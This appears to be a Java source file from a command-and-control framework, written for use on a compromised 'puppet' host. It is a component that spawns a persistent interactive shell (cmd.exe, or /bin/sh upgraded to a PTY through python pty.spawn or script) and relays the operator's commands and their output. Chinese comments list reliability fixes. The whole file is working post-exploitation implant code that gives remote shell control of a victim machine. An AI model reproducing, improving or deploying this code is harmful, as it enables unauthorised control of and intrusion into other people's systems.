package org.leo.core.component;

import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 命令执行组件
 * <p>
 * 在 puppet 端创建交互式 shell（cmd.exe / /bin/sh -i），
 * 通过 write/read/stop 操作实现持久化命令执行。
 * <p>
 * 操作类型（op）：
 * - 首次调用（processMap 不存在）：启动 shell 进程
 * - 0：写入命令（WRITE）
 * - 1：读取输出（READ），附带 alive/exitCode 状态
 * - 2：停止进程（STOP）
 * <p>
 * v3.0 修复：
 * 1. 进程创建竞态 — 启动线程前先占位 processMap，run() 内填充字段
 * 2. OOM 防护 — 输出缓冲区超过 10MB 自动截断
 * 3. 进程状态感知 — read 返回 alive/exitCode
 * 4. params 竞态 — run() 启动前用局部变量捕获 processId
 * 5. 僵尸条目清理 — run() 退出后标记 exited
 * 6. Windows 编码 — 动态检测而非硬编码 GBK
 * 7. 资源泄漏 — destroy 时显式关闭 stdin
 * 8. Windows 输入 — xterm 发送的 \r 转为 \r\n 以适配 cmd.exe 管道模式
 * 9. Windows 回显 — 管道模式无实时回显，手动将输入写入输出缓冲区
 * <p>
 * 遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/匿名内部类/diamond。
 *
 * @author LeoSpring
 * @version 3.0
 */
public class ExecCommandComponent implements Runnable {

    private static final int OP_WRITE = 0;
    private static final int OP_READ = 1;
    private static final int OP_STOP = 2;

    private static final String WINDOWS_CMD = "cmd.exe";

    /**
     * Unix PTY shell 启动脚本（运行时检测）：
     * 1. python3 pty.spawn — 完整 PTY
     * 2. python pty.spawn — 兼容旧系统
     * 3. script -qc — Linux 伪终端包装
     * 4. /bin/sh -i — 最终回退（无 PTY，但可交互）
     */
    private static final String UNIX_PTY_SCRIPT =
        "if command -v python3 >/dev/null 2>&1; then " +
            "exec python3 -c \"import pty; pty.spawn(['/bin/sh'])\"; " +
        "elif command -v python >/dev/null 2>&1; then " +
            "exec python -c \"import pty; pty.spawn(['/bin/sh'])\"; " +
        "elif command -v script >/dev/null 2>&1; then " +
            "exec script -qc /bin/sh /dev/null; " +
        "else " +
            "exec /bin/sh -i; " +
        "fi";

    private static final int BUFFER_SIZE = 1024;
    private static final int MAX_OUTPUT_BYTES = 10 * 1024 * 1024; // 10MB 输出上限

    // processId -> processMap（线程安全）
    private static Map env = new ConcurrentHashMap();

    // 【修复 #4】run() 启动前捕获的 processId，避免 params 被后续调用覆盖
    private static final Map THREAD_PARAMS = new ConcurrentHashMap();

    private HashMap params;
    private HashMap results;

    public void invoke() throws Exception {
        execCommand();
    }

    public void run() {
        // Component 入口：当前线程不在 THREAD_PARAMS 中，说明是 C2 调用而非后台读取线程
        if (!THREAD_PARAMS.containsKey(Thread.currentThread())) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        // 后台读取线程路径
        // 【修复 #4】从 THREAD_PARAMS 获取 processId，而非从可能已被覆盖的 params 中读
        String processId = (String) THREAD_PARAMS.remove(Thread.currentThread());
        if (processId == null) {
            return;
        }

        Map processMap = (Map) env.get(processId);
        if (processMap == null) {
            return; // 不应发生，占位 map 应已存在
        }

        ProcessBuilder builder = createProcessBuilder();
        builder.redirectErrorStream(true);

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        try {
            Process process = builder.start();

            // 填充占位 map 的实际字段
            processMap.put("stdin", process.getOutputStream());
            processMap.put("output", outputStream);
            processMap.put("process", process);

            // 【修复 #6】动态检测 Windows 控制台编码
            String charset = detectCharset();

            InputStream stdout = process.getInputStream();
            InputStreamReader reader = new InputStreamReader(stdout, charset);

            char[] buffer = new char[BUFFER_SIZE];
            int len;

            while ((len = reader.read(buffer)) != -1) {
                byte[] utf8Bytes = new String(buffer, 0, len).getBytes("UTF-8");
                // 【修复 #2】输出超过上限时不再追加，防止 OOM
                synchronized (outputStream) {
                    if (outputStream.size() < MAX_OUTPUT_BYTES) {
                        int remaining = MAX_OUTPUT_BYTES - outputStream.size();
                        if (utf8Bytes.length <= remaining) {
                            outputStream.write(utf8Bytes);
                        } else {
                            outputStream.write(utf8Bytes, 0, remaining);
                        }
                    }
                }
            }

        } catch (IOException ignored) {
            // 进程被 destroy 或 I/O 中断，正常退出
        } finally {
            // 【修复 #5】进程自然退出后标记，供 read 感知
            if (processMap != null) {
                processMap.put("exited", Boolean.TRUE);
            }
        }
    }

    private void execCommand() throws Exception {
        String processId = getStringParam("processId");

        Map processMap = (Map) env.get(processId);

        if (processMap == null) {
            // 【修复 #1】先占位 processMap，再启动线程，避免竞态重复创建
            ConcurrentHashMap placeholder = new ConcurrentHashMap();
            env.put(processId, placeholder);

            // 【修复 #4】通过 THREAD_PARAMS 传递 processId，避免 params 竞态
            Thread t = new Thread(this, "ExecCommand-" + processId);
            t.setDaemon(true);
            THREAD_PARAMS.put(t, processId);
            t.start();

            results.put("code", 200);
            results.put("msg", "process starting");
            return;
        }

        int operation = ((Number) params.get("op")).intValue();

        switch (operation) {
            case OP_WRITE:
                writeCommand(processMap);
                break;
            case OP_READ:
                readOutput(processMap);
                break;
            case OP_STOP:
                destroyProcess(processId, processMap);
                break;
            default:
                throw new IllegalArgumentException("Invalid op: " + operation);
        }

        results.put("code", 200);
    }

    private void writeCommand(Map processMap) throws IOException {
        byte[] command = (byte[]) params.get("cmd");

        OutputStream writer = (OutputStream) processMap.get("stdin");
        if (writer == null) {
            // 进程可能还在启动中，stdin 尚未就绪
            throw new IllegalStateException("stdin not ready, process may still be starting");
        }

        // 【修复 #8】Windows cmd.exe 通过管道读取时需要 \r\n 作为行结束符，
        // 但 xterm.js 按 Enter 只发送 \r，导致 cmd.exe 不识别输入。
        // 将孤立的 \r（不跟随 \n）转换为 \r\n。
        // 【修复 #9】Windows 管道模式无实时回显，手动将输入写入输出缓冲区。
        if (isWindows()) {
            command = convertCrForWindows(command);
            echoForWindows(processMap, command);
        }

        writer.write(command);
        writer.flush();
    }

    /**
     * 【修复 #9】Windows 管道模式下 cmd.exe 不会实时回显输入字符，
     * 手动将输入内容写入输出缓冲区，让前端能即时看到键入内容。
     * 控制字符（除 \r\n 外）不做回显，避免乱码。
     */
    private void echoForWindows(Map processMap, byte[] command) {
        ByteArrayOutputStream outputStream = (ByteArrayOutputStream) processMap.get("output");
        if (outputStream == null) {
            return;
        }
        synchronized (outputStream) {
            for (int i = 0; i < command.length; i++) {
                byte b = command[i];
                if (b == '\r') {
                    // \r\n 回显为换行
                    if (i + 1 < command.length && command[i + 1] == '\n') {
                        outputStream.write('\r');
                        outputStream.write('\n');
                        i++; // 跳过 \n
                    } else {
                        outputStream.write('\r');
                        outputStream.write('\n');
                    }
                } else if (b == '\n') {
                    outputStream.write('\r');
                    outputStream.write('\n');
                } else if (b == '\b' || b == 127) {
                    // 退格：回退一格、覆盖空格、再回退
                    outputStream.write('\b');
                    outputStream.write(' ');
                    outputStream.write('\b');
                } else if (b >= 32) {
                    // 可打印字符正常回显
                    outputStream.write(b);
                }
                // 其他控制字符（\x01-\x1f 除上述外）不回显
            }
        }
    }

    /**
     * 将字节数组中孤立的 \r 转换为 \r\n（Windows cmd.exe 管道输入需要）。
     * 已有的 \r\n 保持不变。
     */
    private byte[] convertCrForWindows(byte[] input) {
        // 先计算需要插入多少个 \n
        int extraCount = 0;
        for (int i = 0; i < input.length; i++) {
            if (input[i] == '\r') {
                if (i + 1 >= input.length || input[i + 1] != '\n') {
                    extraCount++;
                }
            }
        }
        if (extraCount == 0) {
            return input;
        }

        byte[] result = new byte[input.length + extraCount];
        int pos = 0;
        for (int i = 0; i < input.length; i++) {
            result[pos++] = input[i];
            if (input[i] == '\r') {
                if (i + 1 >= input.length || input[i + 1] != '\n') {
                    result[pos++] = '\n';
                }
            }
        }
        return result;
    }

    private void readOutput(Map processMap) throws IOException {
        ByteArrayOutputStream outputStream = (ByteArrayOutputStream) processMap.get("output");

        if (outputStream != null) {
            // 【修复 #2】synchronized 保护 toByteArray + reset 原子性
            byte[] outputData;
            synchronized (outputStream) {
                outputData = outputStream.toByteArray();
                outputStream.reset();
            }
            results.put("data", outputData);
        } else {
            results.put("data", new byte[0]);
        }

        // 【修复 #3】返回进程存活状态和退出码
        Process process = (Process) processMap.get("process");
        if (process != null) {
            try {
                int exitCode = process.exitValue(); // 不阻塞，进程未退出会抛 IllegalThreadStateException
                results.put("alive", Boolean.FALSE);
                results.put("exitCode", Integer.valueOf(exitCode));
            } catch (IllegalThreadStateException e) {
                results.put("alive", Boolean.TRUE);
            }
        } else {
            // process 还未设置（进程启动中）
            results.put("alive", Boolean.TRUE);
            results.put("starting", Boolean.TRUE);
        }

        // 【修复 #5】如果标记了 exited 且 process 也为空，说明启动失败
        if (Boolean.TRUE.equals(processMap.get("exited")) && process == null) {
            results.put("alive", Boolean.FALSE);
            results.put("error", "process failed to start");
        }
    }

    private void destroyProcess(String processId, Map processMap) {
        // 【修复 #7】显式关闭 stdin 流
        OutputStream stdin = (OutputStream) processMap.get("stdin");
        if (stdin != null) {
            try {
                stdin.close();
            } catch (Exception ignored) {
            }
        }

        Process process = (Process) processMap.get("process");
        if (process != null) {
            process.destroy();
        }

        env.remove(processId);
    }

    private ProcessBuilder createProcessBuilder() {
        String[] command;
        if (isWindows()) {
            // /Q 禁用 cmd 自身的命令回显，由 echoForWindows 提供实时回显
            command = new String[]{WINDOWS_CMD, "/Q"};
        } else {
            command = new String[]{"/bin/sh", "-c", UNIX_PTY_SCRIPT};
        }
        return new ProcessBuilder(command);
    }

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("windows");
    }

    /**
     * 【修复 #6】动态检测控制台编码，而非硬编码 GBK
     * 优先 sun.jnu.encoding（JVM 原生编码），其次 file.encoding，最后 fallback
     */
    private String detectCharset() {
        if (!isWindows()) {
            return "UTF-8";
        }
        String charset = System.getProperty("sun.jnu.encoding");
        if (charset != null && charset.length() > 0) {
            return charset;
        }
        charset = System.getProperty("file.encoding");
        if (charset != null && charset.length() > 0) {
            return charset;
        }
        return "GBK"; // Windows 中文 fallback
    }

    private String getStringParam(String key) {
        if (key == null) {
            return null;
        }
        Object value = params.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        try {
            return new String((byte[]) value, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
    }
}
